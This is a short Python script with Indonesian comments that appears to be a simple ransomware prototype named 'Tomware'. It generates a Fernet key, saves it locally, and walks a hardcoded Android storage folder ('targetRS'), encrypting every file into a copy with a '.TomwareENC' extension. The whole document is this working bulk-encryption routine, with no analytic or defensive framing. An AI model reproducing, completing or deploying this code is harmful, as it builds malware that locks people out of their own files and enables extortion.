import os
from cryptography.fernet import Fernet

# Fungsi untuk menghasilkan kunci enkripsi jika belum ada
def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)
    print("Kunci enkripsi telah dibuat dan disimpan sebagai 'secret.key'.")

# Fungsi untuk memuat kunci enkripsi dari file
def load_key():
    return open("secret.key", "rb").read()

# Fungsi untuk mengenkripsi file
def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        file_data = file.read()

    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(file_data)

    # Menyimpan file terenkripsi dengan ekstensi .TomwareENC
    encrypted_file_path = file_path + '.TomwareENC'
    with open(encrypted_file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)

    print(f"File '{file_path}' telah dienkripsi menjadi '{encrypted_file_path}'.")

# Fungsi untuk mengenkripsi seluruh file dalam folder Downloads
def encrypt_folder(folder_path, key):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

# Cek jika kunci sudah ada, jika belum buat kunci baru
if not os.path.exists("secret.key"):
    generate_key()

# Muat kunci enkripsi
key = load_key()

# Folder tempat file yang ingin dienkripsi, misalnya 'Download'
folder_to_encrypt = "/storage/emulated/0/targetRS"  # Path folder download pada Android

# Mulai enkripsi semua file dalam folder
encrypt_folder(folder_to_encrypt, key)
